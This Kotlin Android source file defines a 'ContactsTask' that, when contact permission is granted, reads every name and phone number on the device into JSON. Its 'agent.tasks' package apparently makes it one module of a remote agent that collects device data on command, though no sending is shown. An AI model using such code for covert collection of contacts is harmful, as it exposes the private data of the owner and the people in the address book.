package com.uranium.agent.tasks

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.provider.ContactsContract
import androidx.core.content.ContextCompat
import org.json.JSONArray
import org.json.JSONObject

object ContactsTask {
    fun execute(context: Context): JSONObject {
        val result = JSONObject()
        val array = JSONArray()
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
            val cursor = context.contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)
            cursor?.use {
                val nameIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                val numIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                while (it.moveToNext()) {
                    val obj = JSONObject().apply {
                        put("name", if (nameIdx >= 0) it.getString(nameIdx) else "")
                        put("number", if (numIdx >= 0) it.getString(numIdx) else "")
                    }
                    array.put(obj)
                }
            }
            result.put("contacts", array)
        } else {
            result.put("error", "Permission denied")
        }
        return result
    }
}
